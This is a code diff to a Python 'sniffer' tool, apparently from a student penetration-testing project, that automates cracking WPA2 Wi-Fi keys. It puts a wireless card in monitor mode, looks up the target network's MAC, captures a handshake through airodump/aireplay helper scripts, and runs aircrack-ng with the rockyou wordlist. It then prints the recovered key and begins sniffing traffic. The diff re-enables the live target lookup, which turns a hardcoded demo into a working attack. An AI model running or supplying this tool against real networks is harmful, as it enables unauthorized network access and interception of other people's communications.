@@ -16,16 +16,16 @@ class sniffer():
             print("Starting wlan1mon")
             os.system("sudo airmon-ng start wlan1 1")
             print("Done")
-        print("which wifi u want to crack")
+        print("Which wifi do you want to crack")
         self.wifi = input("Wifi name: ")
         self.find_mac()
 
     def find_mac(self):
         print("Finding Mac-Adress")
-    #    os.system("sudo iwlist wlan0 scan|grep -A 10 -B 10 {} >output.txt".format(self.wifi))
-    #    wifi_list = open('output.txt', 'r').read()
-    #    index = wifi_list.index('Address')
-        self.mac = "EC:08:6B:F9:04:F5" 	#wifi_list[index + len('Address: '):index + len('Address: ') + 17]
+        os.system("sudo iwlist wlan0 scan|grep -A 10 -B 10 {} >output.txt".format(self.wifi))
+        wifi_list = open('output.txt', 'r').read()
+        index = wifi_list.index('Address')
+        self.mac = wifi_list[index + len('Address: '):index + len('Address: ') + 17]
         self.get_key()
 
     def get_key(self):
@@ -34,12 +34,12 @@ class sniffer():
         if not os.path.isfile("WPA_{}-01.cap".format(self.mac)):
             self.make_cap()
         print("Cracking the key")
-        os.system("sudo aircrack-ng WPA_{}-01.cap -w /home/matthias/Documents/WPA/rockyou.txt>key_info.txt".format(self.mac))
+        os.system("sudo aircrack-ng /home/kali/Downloads/PenO3-Kali-WPA2-Construct/WPA2/WPA_{}-01.cap -w /home/kali/rockyou.txt>key_info.txt".format(self.mac))
         key_file = open("key_info.txt", "r").read()
         index = key_file.index("KEY FOUND!") + len('KEY FOUND! [ ')
-        self.key = []
+        self.key = ""
         while key_file[index] != ' ':
-            self.key.append(key_file[index])
+            self.key += key_file[index]
             index += 1
         print("Key has been found: {}".format(self.key))
         print("Starting to sniff")
@@ -78,8 +78,8 @@ class sniffer():
         return filtered_message
 
     def make_cap(self):
-        process2 = sub.Popen(["xterm", "-e", "sudo python3 /home/matthias/Documents/WPA/PenO3-Kali-WPA2/AirodumpWPA2.py {}".format(self.mac)])
-        process1 = sub.Popen(["xterm", "-e", "sudo python3 /home/matthias/Documents/WPA/PenO3-Kali-WPA2/AireplayWPA2.py {}".format(self.mac)])
+        process2 = sub.Popen(["xterm", "-e", "sudo python3 /home/kali/Downloads/PenO3-Kali-WPA2-Construct/WPA2/AirodumpWPA2.py {}".format(self.mac)])
+        process1 = sub.Popen(["xterm", "-e", "sudo python3 /home/kali/Downloads/PenO3-Kali-WPA2-Construct/WPA2/AireplayWPA2.py {}".format(self.mac)])
         process1.wait()
         process2.wait()
 
